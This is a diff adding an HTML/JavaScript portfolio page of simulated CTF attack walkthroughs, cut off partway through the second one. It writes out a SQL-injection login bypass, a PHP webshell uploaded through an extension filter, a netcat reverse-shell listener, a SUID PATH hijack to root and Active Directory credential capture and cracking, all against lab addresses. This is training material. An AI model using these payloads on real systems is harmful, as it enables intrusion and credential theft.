@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Walkthrough Collection — Melvin Wong</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Exo+2:ital,wght@0,300;0,400;0,600;1,300&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#080c0a; --bg2:#0d1410; --bg3:#111a14; --border:#1a2e1e;
+  --green:#00e676; --green-dim:#00803f; --cyan:#00e5ff; --orange:#ff9100;
+  --red:#ff1744; --pink:#f48fb1; --purple:#b388ff; --gold:#ffd700;
+  --text:#c8d8cb; --text-dim:#5a7a60;
+  --mono:'Share Tech Mono',monospace; --display:'Orbitron',sans-serif; --body:'Exo 2',sans-serif;
+  --accent:#00e676; --accent-glow:rgba(0,230,118,0.3);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-weight:300;line-height:1.7;overflow-x:hidden;min-height:100vh;transition:background .6s}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.08) 2px,rgba(0,0,0,.08) 4px);pointer-events:none;z-index:9999}
+body::after{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");pointer-events:none;z-index:9998;opacity:.4}
+.bg-glow{position:fixed;inset:0;pointer-events:none;z-index:0;background:radial-gradient(ellipse 60% 40% at 50% 0%,var(--accent-glow),transparent 70%);opacity:.5;transition:background .8s}
+.gallery-view{display:block;position:relative;z-index:1}.gallery-view.hide{display:none}
+.gallery-hero{padding:6rem 2rem 3rem;text-align:center;position:relative;border-bottom:1px solid var(--border);background:radial-gradient(ellipse 80% 60% at 50% 50%,rgba(0,230,118,.04) 0%,transparent 70%),linear-gradient(rgba(0,230,118,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,230,118,.025) 1px,transparent 1px);background-size:auto,48px 48px,48px 48px}
+.gallery-badge{font-family:var(--mono);font-size:.7rem;letter-spacing:.3em;color:var(--green-dim);border:1px solid var(--green-dim);padding:.3rem 1rem;margin-bottom:1.5rem;display:inline-block;text-transform:uppercase}
+.gallery-title{font-family:var(--display);font-size:clamp(2.5rem,7vw,5rem);font-weight:900;color:#fff;letter-spacing:.1em;line-height:1;margin-bottom:1rem;text-shadow:0 0 40px rgba(0,230,118,.3)}
+.gallery-title span{color:var(--green);text-shadow:0 0 30px var(--accent-glow)}
+.gallery-sub{font-family:var(--mono);font-size:.9rem;color:var(--text-dim);letter-spacing:.15em;max-width:700px;margin:0 auto 2rem}
+.gallery-meta{display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;font-family:var(--mono);font-size:.75rem;color:var(--text-dim);letter-spacing:.15em}
+.gallery-meta .val{color:var(--green);font-weight:700;margin-left:.5rem}
+.gallery-grid-wrap{max-width:1200px;margin:0 auto;padding:4rem 2rem 6rem}
+.gallery-label{font-family:var(--mono);font-size:.65rem;letter-spacing:.4em;color:var(--green-dim);text-transform:uppercase;margin-bottom:.75rem}
+.gallery-header{font-family:var(--display);font-weight:700;font-size:clamp(1.4rem,3vw,2rem);color:#fff;margin-bottom:3rem;letter-spacing:.05em}
+.gallery-header span{color:var(--green)}
+.card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.5rem}
+.wt-card{background:var(--bg2);border:1px solid var(--border);padding:1.8rem 1.5rem;cursor:pointer;position:relative;overflow:hidden;transition:transform .35s cubic-bezier(.2,.9,.2,1),border-color .3s,box-shadow .35s;min-height:320px;display:flex;flex-direction:column}
+.wt-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--card-color);box-shadow:0 0 12px var(--card-glow)}
+.wt-card::after{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 60% 40% at 50% 100%,var(--card-glow),transparent 70%);opacity:0;transition:opacity .35s;pointer-events:none}
+.wt-card:hover{transform:translateY(-6px);border-color:var(--card-color);box-shadow:0 12px 40px -10px var(--card-glow),0 0 20px -5px var(--card-glow)}
+.wt-card:hover::after{opacity:.3}
+.wt-card-num{font-family:var(--mono);font-size:.62rem;letter-spacing:.3em;color:var(--text-dim);margin-bottom:.8rem}
+.wt-card-title{font-family:var(--display);font-weight:900;font-size:2rem;color:#fff;letter-spacing:.08em;margin-bottom:.4rem;line-height:1;transition:color .3s,text-shadow .3s}
+.wt-card:hover .wt-card-title{color:var(--card-color);text-shadow:0 0 20px var(--card-glow)}
+.wt-card-subtitle{font-family:var(--mono);font-size:.72rem;letter-spacing:.2em;color:var(--card-color);margin-bottom:1.2rem;text-transform:uppercase;opacity:.85}
+.wt-card-desc{font-size:.88rem;color:var(--text-dim);line-height:1.6;margin-bottom:1.2rem;flex-grow:1}
+.wt-card-stacks{display:flex;flex-wrap:wrap;gap:.4rem;margin-bottom:1.2rem}
+.wt-stack-pill{font-family:var(--mono);font-size:.6rem;letter-spacing:.1em;padding:.2rem .6rem;border:1px solid var(--border);color:var(--text-dim);background:var(--bg3);text-transform:uppercase}
+.wt-card-footer{display:flex;justify-content:space-between;align-items:center;padding-top:1rem;border-top:1px dashed var(--border);font-family:var(--mono);font-size:.65rem;letter-spacing:.15em}
+.wt-difficulty{padding:.25rem .7rem;border:1px solid var(--card-color);color:var(--card-color);text-shadow:0 0 6px var(--card-glow);text-transform:uppercase}
+.wt-play-hint{color:var(--text-dim);transition:color .3s,transform .3s}
+.wt-card:hover .wt-play-hint{color:var(--card-color);transform:translateX(4px)}
+.gallery-footer{text-align:center;padding:3rem 2rem;border-top:1px solid var(--border);font-family:var(--mono);font-size:.7rem;color:var(--text-dim);letter-spacing:.15em}
+.gallery-footer .by{color:var(--green)}
+.player-view{display:none;position:relative;z-index:1}.player-view.show{display:block}
+.player-top-strip{position:sticky;top:0;z-index:100;background:rgba(8,12,10,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:.75rem 2rem;gap:1rem}
+.player-brand{font-family:var(--display);font-size:.8rem;font-weight:900;color:var(--accent);letter-spacing:.2em;text-shadow:0 0 8px var(--accent-glow);transition:color .4s}
+.player-brand span{color:var(--text);text-shadow:none}
+.btn-back{background:transparent;border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:.68rem;letter-spacing:.2em;padding:.45rem .9rem;cursor:pointer;text-transform:uppercase;transition:all .2s}
+.btn-back:hover{border-color:var(--accent);color:var(--accent);box-shadow:0 0 10px var(--accent-glow)}
+.player-meta{display:flex;gap:1.4rem;font-family:var(--mono);font-size:.65rem;letter-spacing:.15em;color:var(--text-dim)}
+.player-meta .val{color:var(--accent);transition:color .4s}
+.player-app{display:grid;grid-template-columns:300px 1fr;min-height:calc(100vh - 52px)}
+@media (max-width:900px){.player-app{grid-template-columns:1fr}.player-sidebar{position:static!important;height:auto!important;max-height:40vh}}
+.player-sidebar{position:sticky;top:52px;height:calc(100vh - 52px);background:var(--bg2);border-right:1px solid var(--border);padding:1.5rem .8rem;overflow-y:auto}
+.sidebar-title{font-family:var(--display);font-size:.65rem;letter-spacing:.3em;color:var(--text-dim);margin-bottom:.8rem;padding:0 .5rem;text-transform:uppercase}
+.phase-list{list-style:none;display:flex;flex-direction:column;gap:.15rem}
+.phase-item{font-family:var(--mono);font-size:.72rem;padding:.55rem .8rem;color:var(--text-dim);cursor:pointer;border-left:2px solid transparent;transition:all .2s;display:flex;align-items:center;gap:.6rem;letter-spacing:.05em;line-height:1.4}
+.phase-item:hover{color:var(--text);background:rgba(255,255,255,.02)}
+.phase-item.done{color:var(--text-dim);border-left-color:var(--text-dim)}
+.phase-item.done .phase-num-tag::before{content:'✓ ';color:var(--green)}
+.phase-item.active{background:rgba(255,255,255,.05);border-left-color:var(--accent);color:#fff}
+.phase-item.active .phase-num-tag{color:var(--accent)}
+.phase-num-tag{display:inline-block;min-width:1.6rem;color:var(--text-dim);font-size:.62rem;flex-shrink:0}
+.stage{padding:2rem;display:flex;flex-direction:column;gap:1.2rem;max-width:1200px}
+.phase-label{font-family:var(--mono);font-size:.65rem;letter-spacing:.4em;color:var(--text-dim);text-transform:uppercase;margin-bottom:.4rem}
+.phase-title{font-family:var(--display);font-size:clamp(1.2rem,2.2vw,1.7rem);font-weight:700;color:#fff;letter-spacing:.02em;line-height:1.2;margin-bottom:.4rem}
+.phase-title .acc{color:var(--accent);text-shadow:0 0 20px var(--accent-glow);transition:all .4s}
+.phase-desc{font-size:.88rem;color:var(--text-dim);max-width:80ch}
+.terminal{background:#050807;border:1px solid var(--border);border-radius:4px;overflow:hidden;box-shadow:0 0 40px var(--accent-glow),inset 0 0 80px rgba(0,0,0,.3);display:flex;flex-direction:column;min-height:440px;max-height:70vh;transition:box-shadow .5s}
+.terminal-bar{display:flex;align-items:center;gap:.8rem;padding:.5rem 1rem;background:var(--bg3);border-bottom:1px solid var(--border)}
+.terminal-dots{display:flex;gap:.4rem}
+.terminal-dots span{width:10px;height:10px;border-radius:50%}
+.terminal-dots span:nth-child(1){background:#ff5f56}
+.terminal-dots span:nth-child(2){background:#ffbd2e}
+.terminal-dots span:nth-child(3){background:#27c93f}
+.terminal-host{font-family:var(--mono);font-size:.7rem;color:var(--text-dim);letter-spacing:.1em;margin-left:.5rem;flex:1;text-align:center}
+.terminal-status{font-family:var(--mono);font-size:.6rem;color:var(--accent);letter-spacing:.2em;display:flex;align-items:center;gap:.4rem;transition:color .4s}
+.live-dot{width:6px;height:6px;border-radius:50%;background:var(--red);animation:pulse 1.2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.terminal-body{flex:1;overflow-y:auto;padding:1rem 1.2rem;font-family:var(--mono);font-size:.78rem;line-height:1.7;color:var(--text);scroll-behavior:smooth}
+.terminal-body::-webkit-scrollbar{width:6px}
+.terminal-body::-webkit-scrollbar-track{background:transparent}
+.terminal-body::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+.line{white-space:pre-wrap;word-break:break-word}
+.line.prompt .user{color:var(--green);font-weight:bold}
+.line.prompt .host{color:var(--cyan)}
+.line.prompt .path{color:var(--text-dim)}
+.line.prompt .ps{color:var(--purple)}
+.line.out{color:var(--text-dim)}
+.line.out.hit{color:var(--text)}
+.line.info{color:var(--cyan)}
+.line.warn{color:var(--orange)}
+.line.crit{color:var(--red)}
+.line.cmd .c{color:var(--green)}
+.line.cmd .p{color:var(--orange)}
+.line.cmd .s{color:var(--pink)}
+.line.cmd .f{color:var(--cyan)}
+.line.cmd .k{color:var(--pink)}
+.line.cmd .m{color:var(--text-dim);font-style:italic}
+.line.cmd .v{color:var(--purple)}
+.cursor{display:inline-block;width:.55em;height:1.1em;background:var(--accent);vertical-align:text-bottom;animation:blink 1s steps(2) infinite;box-shadow:0 0 8px var(--accent-glow);transition:background .4s}
+@keyframes blink{50%{opacity:0}}
+.progress-container{height:2px;background:var(--border);position:relative;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--green-dim),var(--accent));box-shadow:0 0 8px var(--accent-glow);width:0%;transition:width .4s,background .6s}
+.controls{display:flex;align-items:center;gap:.7rem;padding:.8rem 1rem;background:var(--bg2);border:1px solid var(--border);border-radius:4px;flex-wrap:wrap}
+.btn{background:transparent;border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:.68rem;letter-spacing:.15em;padding:.5rem .9rem;cursor:pointer;text-transform:uppercase;transition:all .2s}
+.btn:hover:not(:disabled){border-color:var(--accent);color:var(--accent);box-shadow:0 0 10px var(--accent-glow)}
+.btn:disabled{opacity:.3;cursor:not-allowed}
+.btn.primary{border-color:var(--accent);color:var(--accent)}
+.btn.primary:hover:not(:disabled){background:var(--accent);color:var(--bg);text-shadow:none}
+.speed-group{display:flex;align-items:center;gap:.35rem;margin-left:auto;font-family:var(--mono);font-size:.62rem;color:var(--text-dim);letter-spacing:.15em}
+.speed-btn{background:transparent;border:1px solid var(--border);color:var(--text-dim);font-family:var(--mono);font-size:.62rem;padding:.3rem .5rem;cursor:pointer;transition:all .2s}
+.speed-btn.active{border-color:var(--accent);color:var(--accent)}
+.complete-screen{display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:3rem 2rem;background:var(--bg2);border:1px solid var(--accent);border-radius:4px;box-shadow:0 0 60px var(--accent-glow)}
+.complete-screen.show{display:flex}
+.complete-badge{font-family:var(--mono);font-size:.72rem;letter-spacing:.35em;color:var(--accent);border:1px solid var(--accent);padding:.4rem 1.2rem;margin-bottom:1.2rem;text-shadow:0 0 8px var(--accent-glow)}
+.complete-title{font-family:var(--display);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;color:#fff;margin-bottom:.5rem;letter-spacing:.1em}
+.complete-title .a1{color:var(--accent);text-shadow:0 0 25px var(--accent-glow)}
+.complete-sub{font-family:var(--mono);font-size:.8rem;color:var(--text-dim);letter-spacing:.15em;margin-bottom:1.5rem}
+.flag-captured{padding:1rem 1.5rem;border:1px solid var(--border);background:var(--bg3);min-width:240px;margin:.5rem}
+.flag-captured-label{font-family:var(--mono);font-size:.6rem;color:var(--text-dim);letter-spacing:.2em;margin-bottom:.5rem}
+.flag-captured-val{font-family:var(--mono);font-size:.78rem;background:repeating-linear-gradient(45deg,var(--border),var(--border) 4px,var(--bg3) 4px,var(--bg3) 8px);padding:.4rem .8rem;color:var(--text-dim);letter-spacing:.3em;text-align:center}
+.complete-actions{display:flex;gap:1rem;margin-top:1.5rem;flex-wrap:wrap;justify-content:center}
+</style>
+</head>
+<body>
+
+<div class="bg-glow"></div>
+
+<div class="gallery-view" id="gallery-view">
+  <header class="gallery-hero">
+    <div class="gallery-badge">// INTERACTIVE PORTFOLIO · 2026</div>
+    <h1 class="gallery-title">WALK<span>THROUGHS</span></h1>
+    <p class="gallery-sub">A rotating set of simulated attack chains. Each walkthrough plays back in a live-typed terminal with phase-by-phase progression and redacted flags.</p>
+    <div class="gallery-meta">
+      <div>COLLECTION<span class="val">4 BOXES</span></div>
+      <div>TOTAL PHASES<span class="val">25</span></div>
+      <div>STACKS<span class="val">WEB · AD · BIN · CRYPTO</span></div>
+    </div>
+  </header>
+  <main class="gallery-grid-wrap">
+    <div class="gallery-label">// SELECT A WALKTHROUGH</div>
+    <h2 class="gallery-header">Portfolio <span>Collection</span></h2>
+    <div class="card-grid" id="card-grid"></div>
+  </main>
+  <footer class="gallery-footer">
+    CRAFTED BY <span class="by">MELVIN WONG</span> · FLAGS REDACTED · EDUCATIONAL USE
+  </footer>
+</div>
+
+<div class="player-view" id="player-view">
+  <div class="player-top-strip">
+    <button class="btn-back" id="btn-gallery">◀ BACK TO GALLERY</button>
+    <div class="player-brand" id="player-brand">BOX::<span>—</span></div>
+    <div class="player-meta">
+      <div>PHASE <span class="val" id="phase-indicator">00 / 00</span></div>
+      <div>TIER <span class="val" id="tier-indicator">—</span></div>
+    </div>
+  </div>
+
+  <div class="player-app">
+    <aside class="player-sidebar">
+      <div class="sidebar-title">Phase Chain</div>
+      <ul class="phase-list" id="phase-list"></ul>
+    </aside>
+
+    <main class="stage">
+      <div class="phase-header">
+        <div class="phase-label" id="phase-label">//</div>
+        <h1 class="phase-title" id="phase-title">—</h1>
+        <p class="phase-desc" id="phase-desc">—</p>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span></span><span></span><span></span></div>
+          <div class="terminal-host" id="term-host">attacker@kali ~ </div>
+          <div class="terminal-status"><span class="live-dot"></span><span id="term-status">IDLE</span></div>
+        </div>
+        <div class="terminal-body" id="term"></div>
+        <div class="progress-container"><div class="progress-fill" id="progress"></div></div>
+      </div>
+
+      <div class="controls">
+        <button class="btn primary" id="btn-play">▶ PLAY</button>
+        <button class="btn" id="btn-pause" disabled>⏸ PAUSE</button>
+        <button class="btn" id="btn-prev">⏮</button>
+        <button class="btn" id="btn-next">⏭</button>
+        <button class="btn" id="btn-reset">⟲ RESET</button>
+        <div class="speed-group">
+          SPEED
+          <button class="speed-btn" data-speed="2">0.5×</button>
+          <button class="speed-btn active" data-speed="1">1×</button>
+          <button class="speed-btn" data-speed="0.4">2.5×</button>
+          <button class="speed-btn" data-speed="0.15">8×</button>
+          <button class="speed-btn" data-speed="0.05">20×</button>
+        </div>
+      </div>
+
+      <div class="complete-screen" id="complete">
+        <div class="complete-badge">BOX PWNED</div>
+        <div class="complete-title"><span class="a1" id="complete-title">—</span></div>
+        <div class="complete-sub" id="complete-sub">—</div>
+        <div style="display:flex;gap:1rem;flex-wrap:wrap;justify-content:center">
+          <div class="flag-captured">
+            <div class="flag-captured-label">USER FLAG</div>
+            <div class="flag-captured-val">█ ▓ ░ REDACTED ░ ▓ █</div>
+          </div>
+          <div class="flag-captured">
+            <div class="flag-captured-label">ROOT FLAG</div>
+            <div class="flag-captured-val">█ ▓ ░ REDACTED ░ ▓ █</div>
+          </div>
+        </div>
+        <div class="complete-actions">
+          <button class="btn primary" id="btn-next-box">▶ NEXT BOX</button>
+          <button class="btn" id="btn-replay">⟲ REPLAY</button>
+          <button class="btn" id="btn-back-gallery">◀ GALLERY</button>
+        </div>
+      </div>
+    </main>
+  </div>
+</div>
+
+<script>
+const WALKTHROUGHS = [{"id":"phantom","name":"PHANTOM","number":"01","difficulty":"EASY","theme":"Web Application","tagline":"sql injection · file upload · suid","desc":"A classic web-app chain. Discover a login SQLi, bypass an image-only upload filter to plant a shell, stabilize, and escalate via a custom SUID binary.","stacks":["SQLi","Upload bypass","SUID","Reverse shell"],"color":"#ff9100","glow":"rgba(255,145,0,0.3)","phases":[{"label":"// PHASE 01 · RECON","title":"Port scan + web probe","desc":"Sweep the target, identify the web stack, start mapping.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">nmap</span> <span class=\"p\">-sC -sV -p-</span> <span class=\"p\">--min-rate=2000</span> <span class=\"s\">10.10.20.15</span>","pause":700},{"t":"out","x":"PORT   STATE SERVICE VERSION"},{"t":"hit","x":"22/tcp open  ssh     OpenSSH 8.4p1"},{"t":"hit","x":"80/tcp open  http    Apache httpd 2.4.52"},{"t":"out","x":"|_http-title: PhantomBlog — login required"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">whatweb</span> <span class=\"s\">http://10.10.20.15</span>","pause":500},{"t":"hit","x":"Apache[2.4.52], PHP[8.1.2], MySQL, HTML5"},{"t":"info","x":"[+] LAMP stack — prime target for classic SQLi + upload chain"}]},{"label":"// PHASE 02 · SQL INJECTION","title":"Login bypass + data dump","desc":"The login form drops input directly into a query. A classic auth bypass opens the door; sqlmap dumps the users table.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-s -X</span> POST <span class=\"s\">\"http://10.10.20.15/login.php\"</span> <span class=\"k\">\\</span>\n     <span class=\"p\">-d</span> <span class=\"s\">\"user=admin' OR '1'='1'-- -&amp;pass=x\"</span> <span class=\"p\">-c</span> c.txt <span class=\"p\">-L</span>","pause":800},{"t":"hit","x":"HTTP/1.1 302 Found"},{"t":"hit","x":"Location: /dashboard.php"},{"t":"hit","x":"Welcome back, admin"},{"t":"info","x":"[+] Auth bypass confirmed — now dump creds for SSH reuse"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">sqlmap</span> <span class=\"p\">-u</span> <span class=\"s\">\"http://10.10.20.15/login.php\"</span> <span class=\"p\">--data</span>=<span class=\"s\">\"user=*&amp;pass=x\"</span> <span class=\"k\">\\</span>\n        <span class=\"p\">-D</span> phantom <span class=\"p\">-T</span> users <span class=\"p\">--dump --batch</span>","pause":1100},{"t":"out","x":"Database: phantom · Table: users"},{"t":"hit","x":"| id | username | password (bcrypt)                   |"},{"t":"hit","x":"| 1  | admin    | $2y$10$R3DACTED...                  |"},{"t":"hit","x":"| 2  | webdev   | $2y$10$R3DACTED...                  |"},{"t":"warn","x":"[!] bcrypt — slow crack. Move on to upload instead."}]},{"label":"// PHASE 03 · UPLOAD BYPASS","title":"Double-extension → PHP execution","desc":"Dashboard allows image uploads but only checks the trailing extension. shell.phtml.png slips past.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">cat</span> <span class=\"k\">&gt;</span> shell.phtml.png <span class=\"k\">&lt;&lt;</span> <span class=\"s\">'EOF'</span>"},{"t":"out","x":"&lt;?php system($_GET[\"c\"]); ?&gt;"},{"t":"out","x":"EOF"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-b</span> c.txt <span class=\"p\">-F</span> <span class=\"s\">\"avatar=@shell.phtml.png\"</span> <span class=\"k\">\\</span>\n     <span class=\"s\">http://10.10.20.15/upload.php</span>","pause":900},{"t":"hit","x":"Upload OK: /uploads/shell.phtml.png"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"s\">\"http://10.10.20.15/uploads/shell.phtml.png?c=id\"</span>","pause":500},{"t":"hit","x":"uid=33(www-data) gid=33(www-data) groups=33(www-data)"},{"t":"info","x":"[+] RCE as www-data via .phtml handler"}]},{"label":"// PHASE 04 · REVERSE SHELL","title":"Stabilize interactive TTY","desc":"Launch a bash reverse shell through the webshell, upgrade to a proper PTY.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">rlwrap nc</span> <span class=\"p\">-lvnp</span> <span class=\"f\">4444</span>","pause":400},{"t":"out","x":"listening on [any] 4444 ..."},{"t":"blank"},{"t":"out","x":"[*] firing payload via curl in second terminal..."},{"t":"blank"},{"t":"hit","x":"connect to [10.10.20.100] from (UNKNOWN) [10.10.20.15] 41932"},{"t":"prompt","x":"<span class=\"user\">www-data@phantom</span>:<span class=\"path\">/var/www/html/uploads</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> <span class=\"p\">-c</span> <span class=\"s\">'import pty; pty.spawn(\"/bin/bash\")'</span>","pause":400},{"t":"prompt","x":"<span class=\"user\">www-data@phantom</span>:<span class=\"path\">/var/www/html/uploads</span>$ "},{"t":"cmd","x":"<span class=\"c\">export</span> <span class=\"k\">TERM</span>=<span class=\"s\">xterm-256color</span>"},{"t":"info","x":"[+] Stable shell as www-data"}]},{"label":"// PHASE 05 · USER PIVOT","title":"Config files → user shell","desc":"LAMP site always has creds in a config file. Reuse for the dev user.","host":"www-data@phantom ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">www-data@phantom</span>:<span class=\"path\">/var/www/html</span>$ "},{"t":"cmd","x":"<span class=\"c\">grep</span> <span class=\"p\">-r</span> password config/ <span class=\"k\">2&gt;/dev/null</span>","pause":500},{"t":"hit","x":"config/db.inc.php:$db_pass = 'Phant0m_Blog_2024!';"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">www-data@phantom</span>:<span class=\"path\">/var/www/html</span>$ "},{"t":"cmd","x":"<span class=\"c\">cat</span> /etc/passwd | <span class=\"c\">grep</span> <span class=\"s\">bash</span>","pause":400},{"t":"hit","x":"dev:x:1001:1001:,,,:/home/dev:/bin/bash"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">www-data@phantom</span>:<span class=\"path\">/var/www/html</span>$ "},{"t":"cmd","x":"<span class=\"c\">su</span> dev","pause":300},{"t":"out","x":"Password: Phant0m_Blog_2024!"},{"t":"prompt","x":"<span class=\"user\">dev@phantom</span>:<span class=\"path\">/var/www/html</span>$ "},{"t":"cmd","x":"<span class=\"c\">cat</span> ~/user.txt","pause":400},{"t":"hit","x":"█░▒▓░▒ REDACTED ▒░▓▒░█"},{"t":"info","x":"[+] USER FLAG captured"}]},{"label":"// PHASE 06 · SUID PRIVESC","title":"Custom SUID binary → root","desc":"A bespoke SUID binary leaks PATH. Hijack a dependent command, get root.","host":"dev@phantom ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">dev@phantom</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">find</span> / <span class=\"p\">-perm -4000</span> <span class=\"p\">-type</span> f <span class=\"f\">2&gt;/dev/null</span>","pause":700},{"t":"out","x":"/usr/bin/pkexec"},{"t":"out","x":"/usr/bin/sudo"},{"t":"hit","x":"/opt/phantom/checklog"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">dev@phantom</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">strings</span> /opt/phantom/checklog | <span class=\"c\">grep</span> <span class=\"p\">-iE</span> <span class=\"s\">\"tail|cat\"</span>","pause":500},{"t":"hit","x":"tail -n 50 /var/log/phantom/app.log"},{"t":"warn","x":"[!] Calls `tail` without absolute path — PATH hijack"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">dev@phantom</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">cd</span> /tmp <span class=\"k\">&&</span> <span class=\"c\">echo</span> <span class=\"s\">'#!/bin/bash\\n/bin/bash -p'</span> <span class=\"k\">&gt;</span> tail","pause":500},{"t":"cmd","x":"<span class=\"c\">chmod</span> +x tail <span class=\"k\">&&</span> <span class=\"c\">export</span> <span class=\"k\">PATH</span>=<span class=\"s\">/tmp:$PATH</span>"},{"t":"cmd","x":"/opt/phantom/checklog","pause":400},{"t":"hit","x":"# whoami"},{"t":"hit","x":"root"},{"t":"prompt","x":"<span class=\"user\">#</span> "},{"t":"cmd","x":"<span class=\"c\">cat</span> /root/root.txt","pause":300},{"t":"hit","x":"█░▒▓░▒ REDACTED ▒░▓▒░█"},{"t":"info","x":"[+] ROOT FLAG captured · PHANTOM pwned"}]}]},{"id":"tempest","name":"TEMPEST","number":"02","difficulty":"MEDIUM","theme":"Active Directory","tagline":"responder · kerberoast · bloodhound · dcsync","desc":"A bread-and-butter AD path. Poison the network for NTLMv2, pivot on cracked creds, Kerberoast a weak SPN, then DCSync.","stacks":["LLMNR","Hashcat","Kerberoast","BloodHound","DCSync"],"color":"#00e5ff","glow":"rgba(0,229,255,0.3)","phases":[{"label":"// PHASE 01 · NETWORK POISONING","title":"Responder for LLMNR/NBT-NS","desc":"Windows hosts fall back to LLMNR when DNS fails. Capture NTLMv2 from a misrouted share lookup.","host":"root@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">responder</span> <span class=\"p\">-I</span> eth0 <span class=\"p\">-wd</span>","pause":900},{"t":"out","x":"[+] Listening for events..."},{"t":"out","x":"[+] Poisoners: LLMNR, NBT-NS, DNS/MDNS"},{"t":"blank"},{"t":"warn","x":"[*] [LLMNR] Poisoned answer to 10.10.30.41 for FILESRV-BAKUP"},{"t":"hit","x":"[SMB] NTLMv2-SSP Client   : 10.10.30.41"},{"t":"hit","x":"[SMB] NTLMv2-SSP Username : TEMPEST\\j.chen"},{"t":"hit","x":"[SMB] NTLMv2-SSP Hash     : j.chen::TEMPEST:a8b2...:1122...:0101..."},{"t":"info","x":"[+] NTLMv2 hash captured — time to crack"}]},{"label":"// PHASE 02 · HASH CRACK","title":"Hashcat mode 5600","desc":"Run the NTLMv2 hash against rockyou + best64 rules.","host":"root@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">hashcat</span> <span class=\"p\">-m</span> <span class=\"f\">5600</span> ntlmv2.hash <span class=\"s\">rockyou.txt</span> <span class=\"p\">-r</span> <span class=\"s\">best64.rule</span>","pause":1300},{"t":"out","x":"Hashcat starting — rate 42.1 MH/s"},{"t":"out","x":"Status: Running · Progress: 34.2%"},{"t":"blank"},{"t":"hit","x":"J.CHEN::TEMPEST:... : Autumn2024!"},{"t":"hit","x":"Status.............: Cracked"},{"t":"info","x":"[+] TEMPEST\\j.chen : Autumn2024!"}]},{"label":"// PHASE 03 · DOMAIN ENUM","title":"CrackMapExec + user list","desc":"Valid domain creds. Enumerate users, find the service accounts.","host":"root@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">crackmapexec</span> smb <span class=\"s\">10.10.30.10</span> <span class=\"p\">-u</span> <span class=\"s\">j.chen</span> <span class=\"p\">-p</span> <span class=\"s\">'Autumn2024!'</span>","pause":700},{"t":"hit","x":"SMB  10.10.30.10  445  DC01  [+] tempest.lab\\j.chen:Autumn2024!"},{"t":"blank"},{"t":"prompt","x":"<span 